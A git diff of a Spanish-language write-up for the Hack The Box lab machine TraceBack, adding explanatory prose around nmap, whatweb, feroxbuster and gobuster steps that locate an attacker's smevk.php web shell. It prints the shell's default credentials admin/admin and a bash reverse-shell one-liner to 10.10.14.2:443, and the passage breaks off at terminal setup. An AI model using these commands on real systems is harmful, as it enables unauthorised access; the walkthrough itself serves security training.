@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`TraceBack`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.181 -oG allPorts
@@ -48,7 +48,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
            Raw packets sent: 74435 (3.275MB) | Rcvd: 73661 (2.947MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache` y el servicio`SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.10.181 -A -oN targeted -oX targetedXML
@@ -95,7 +95,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 12.05 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -104,29 +104,27 @@ Nmap done: 1 IP address (1 host up) scanned in 12.05 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/5377_vmware_SCordmCU0Y.png" alt=""><figcaption></figcaption></figure>
 
 ## Web Enumeration
 
-
+Realizaremos a través de la herramienta de `whatweb` un reconocimiento inicial de las tecnologías que utiliza la aplicación web.
 
 ```bash
 ❯ whatweb -a 3 http://10.10.10.181/
 http://10.10.10.181/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.181], Title[Help us]
 ```
 
-
-
-
+Accederemos a http://10.10.10.181 y nos encontramos con la siguiente página web. Al parecer la página web ha sido hackeada por un atacante. Por otro lado, indica el atacante que ha dejado un `backdoor` accesible para toda la red.
 
 <figure><img src="../../.gitbook/assets/imagen (476).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizamos una enumeración de archivos `PHP` pero no logramos encontrar nada en la aplicación web.
 
 ```bash
-❯ feroxbuster -u http://10.10.10.181/ -t 200 -C 500,502,404 -x php,aspx
+❯ feroxbuster -u http://10.10.10.181/ -t 200 -C 500,502,404 -x php
                                                                                                                                                                                                                                       
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -154,13 +152,13 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 [####################] - 73s    90000/90000   1235/s  http://10.10.10.181/     
 ```
 
-
-
 ## Initial Foothold
 
 ### Searching for a web shell uploaded by the attacker
 
+Buscamos en Internet sobre las `web shells` más famosas para poder hacernos un listado del nombre de dichas `web shells`. Nos encontramos con el siguiente repositorio de GitHub el cual contiene diferentes nombres de `web shells`.
 
+Nos copiaremos el contenido de las diferentes `web shells`que aparecen en el repositorio.
 
 <figure><img src="../../.gitbook/assets/imagen (477).png" alt=""><figcaption></figcaption></figure>
 
@@ -168,9 +166,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 <figure><img src="../../.gitbook/assets/imagen (478).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Trataremos el contenido que hemos copiado del repositorio de GitHub para solamente quedarnos con los nombres de las `web shells`y almacenarlo en un archivo llamado `webshells.txt`.
 
 ```bash
 ❯ cat webshells.txt
@@ -230,7 +226,9 @@ shell.jsp
 ❯ cat webshells.txt | awk '{print $1}' | grep -vE 'Name|Language|PHP|ASP|JSP' | sponge webshells.txt
 ```
 
+Una vez tengamos un listado de las `web shells` más conocidas, probaremos de realizar una enumeración con `gobuster` para ver si logramos encontrar la `web shell`subida en la página web.
 
+En el resultado obtenido, logramos encontrar una `web shell` llamada `smevk.php`.
 
 ```bash
 ❯ gobuster dir -u http://10.10.10.181/ -w webshells.txt -t 50 -b 503,404
@@ -257,26 +255,35 @@ Finished
 
 ### Using SmEvK\_PathAn Shell to get a Reverse Shell
 
-admin/admin
+Al acceder a http://10.10.10.181/smevk.php nos encontramos con la `web shell`que el atacante subió a la aplicación web. Al acceder se nos requiere ingresar credenciales de acceso. Investigando más a fondo sobre la `web shell` nos encontramos con el repositorio en el cual nos indican que las credenciales por defecto son `admin/admin`.
+
+{% embed url="https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php" %}
 
 <figure><img src="../../.gitbook/assets/5380_vmware_0RFZZ4peYi.png" alt=""><figcaption></figcaption></figure>
 
+Finalmente logramos obtener acceso a la `web shell` en la cual nos permite realizar diferentes opciones.
 
+* Ejecutar comandos
+* Crear directorios
+* Mover directorios
+* Leer archivos
+* Subir archivos
+* etc
 
 <figure><img src="../../.gitbook/assets/imagen (479).png" alt=""><figcaption></figcaption></figure>
 
-
+Probamos de utilizar el apartado de `Execute` para verificar si podemos lograr ejecutar comandos en el equipo víctima. En nuestro primer intento, al ejecutar el comando `whoami` se nos muestra el resultado correctamente, por lo tanto, logramos obtener un `RCE` a través de esta `web shell`.
 
 <figure><img src="../../.gitbook/assets/imagen (480).png" alt=""><figcaption></figcaption></figure>
 
-
+El siguiente paso será lograr obtener acceso remoto al sistema, para ello nos pondremos en escucha con `nc`.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos en la `web shell` el siguiente comando que es la sintaxis de la típica Reverse Shell.
 
 ```bash
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'
@@ -284,7 +291,7 @@ listening on [any] 443 ...
 
 <figure><img src="../../.gitbook/assets/imagen (481).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que finalmente logramos obtener acceso al sistema como el usuario `webadmin`.
 
 ```bash
 ❯ nc -nlvp 443
@@ -295,7 +302,7 @@ bash: no job control in this shell
 webadmin@traceback:/var/www/html$ 
 ```
 
-
+Al obtener la Reverse Shell, realizaremos el tratamiento de la terminal para disponer de una TTY totalmente interactiva.
 
 ```bash
 ❯ nc -nlvp 443
